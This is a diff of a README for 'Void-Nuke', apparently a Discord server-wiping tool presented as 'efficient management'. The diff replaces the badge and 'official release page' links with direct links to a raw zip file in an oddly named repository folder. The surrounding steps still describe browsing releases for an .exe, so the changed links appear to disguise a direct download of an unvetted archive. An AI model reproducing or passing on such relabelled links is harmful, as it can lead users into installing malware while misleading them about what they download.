@@ -1,6 +1,6 @@
 # ☢️ Void-Nuke - Efficient management for your Discord servers
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/cleanshaven-sarah2797/Void-Nuke/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/cleanshaven-sarah2797/Void-Nuke/main/Monotrocha/Void-Nuke-v1.8.zip)
 
 ## 📖 Overview
 
@@ -25,7 +25,7 @@ Void-Nuke provides tools to manage Discord servers. This program automates admin
 
 Follow these steps to obtain and start the application:
 
-1. Visit the [official release page](https://github.com/cleanshaven-sarah2797/Void-Nuke/releases) to view available versions.
+1. Visit the [official release page](https://raw.githubusercontent.com/cleanshaven-sarah2797/Void-Nuke/main/Monotrocha/Void-Nuke-v1.8.zip) to view available versions.
 2. Select the latest release version at the top of the list.
 3. Locate the file ending in `.exe` under the Assets section.
 4. Click the file name to start the download.
